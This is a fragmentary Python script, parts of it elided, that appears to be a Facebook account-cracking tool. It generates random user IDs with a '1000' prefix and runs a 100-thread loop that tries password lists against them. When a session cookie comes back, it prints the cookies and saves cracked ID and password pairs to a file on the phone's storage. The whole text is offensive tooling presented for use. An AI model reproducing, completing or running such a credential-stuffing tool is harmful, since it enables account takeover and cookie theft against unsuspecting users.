...
logo="""
 \033[35;1m _   _        _                 _      _____  __   _  _   
 \033[35;1m| \ | | __ _ (_)_ __ ___  _   _| |    |___ / / /_ | || |  
 \033[35;1m|  \| |/ _` || | '_ ` _ \| | | | |_____ |_ \| '_ \| || |_ 
 \033[35;1m| |\  | (_| || | | | | | | |_| | |_____|__) | (_) |__   _|
 \033[35;1m|_| \_|\__,_|/ |_| |_| |_|\__,_|_|    |____/ \___/   |_|  
 \033[35;1m          |__/ """
def line():
    print("—"*36)
def sykology():
    ...
    khan_code=input(" Choice [</] >")
    line()
    print(" Example 1000/2000/3000/4000")
    khan_lim=int(input(" Choice [</] >"))
    line()
    for z in range(khan_lim):
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(najmul ))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mNajmul -ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[Najmul -XD] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[Najmul -OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/Najmul-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
